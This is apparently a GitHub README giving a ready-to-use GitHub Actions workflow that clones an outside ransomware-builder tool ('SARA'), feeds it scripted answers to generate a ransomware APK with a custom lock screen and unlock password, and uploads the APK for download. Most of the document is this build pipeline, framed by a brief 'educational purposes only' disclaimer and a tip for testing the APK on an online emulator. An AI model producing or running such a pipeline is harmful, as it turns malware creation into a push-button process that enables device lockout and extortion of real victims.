# GitHub-Actions-Ransomware-APK

This repository provides an automated solution for creating Ransomware APKs using GitHub Actions. This setup leverages the power of CI/CD to build and deploy APK files for educational and research purposes. 

> **Warning:** This project is intended for educational purposes only. Misuse of ransomware can lead to legal consequences.

## Table of Contents
- Prerequisites
- Repository Structure
- Setting Up GitHub Actions
- Workflow Configuration
- Downloading the APK
- Testing APKs Online
- Ethical Considerations
- License

## Prerequisites
- An Android project hosted on GitHub.
- Basic knowledge of Git and GitHub.
- Familiarity with Android development and APK creation.

## Repository Structure
Ensure your repository has the following structure:

    .github/workflows/main.yml


## Setting Up GitHub Actions
1. **Create the necessary directories**:
   - In the root of your repository, create a directory named `.github`.
   - Inside `.github`, create another directory named `workflows`.

2. **Create the workflow file**:
   - Inside the `workflows` directory, create a file named `main.yml`.

## Workflow Configuration
Edit the `main.yml` file with the following configuration:

```yaml
name: Run SARA Installation and Customize Screen Ransomware

on:
  push:
    branches:
      - main
  pull_request:
    branches:
      - main

jobs:
  install-sara:
    runs-on: ubuntu-latest

    steps:
    - name: Checkout code
      uses: actions/checkout@v2

    - name: Install dependencies and run SARA with custom config
      run: |
        # Clone the SARA repository
        git clone https://github.com/termuxhackers-id/SARA
        cd SARA
        # Install dependencies
        sudo bash install.sh
        # Automatically select option 3 and fill in custom configuration
        echo -e "3\nmiss\nswati\nhellow word\nrobot.png\n12345678\n2" | python3 sara.py || true
        
        # Check if miss.apk was created
        if [ ! -f miss.apk ]; then
          echo "Error: miss.apk was not created."
          exit 1
        fi
        echo "APK created successfully."

    - name: List files for debugging
      run: |
        echo "Current directory contents:"
        ls -la ./SARA  # Adjust if necessary to show the correct directory

    - name: Upload APK as artifact
      if: success()  # Only upload if previous steps succeeded
      uses: actions/upload-artifact@v3
      with:
        name: miss.apk
        path: ./SARA/miss.apk  # Ensure this is the correct path to the APK
        retention-days: 1  # Keep the artifact for 1 day
      continue-on-error: true  # Ignore the upload error if it occurs

    - name: Clean up old artifacts (optional)
      run: |
        echo "This step can be used to clean up old artifacts if needed."
  ```

# Downloading the APK

After pushing changes to your repository:

  Navigate to the Actions tab in GitHub.
  Select the latest workflow run.
  In the Artifacts section, you’ll find the uploaded APK. Click to download it.


## Testing APKs Online
To avoid testing APKs directly on your phone, you can use online testing platforms. Once you've , you can upload it to services like [Uptoplay](https://www.uptoplay.net/media/system/ext/intro-androidemulator.php) for testing your APK files online.









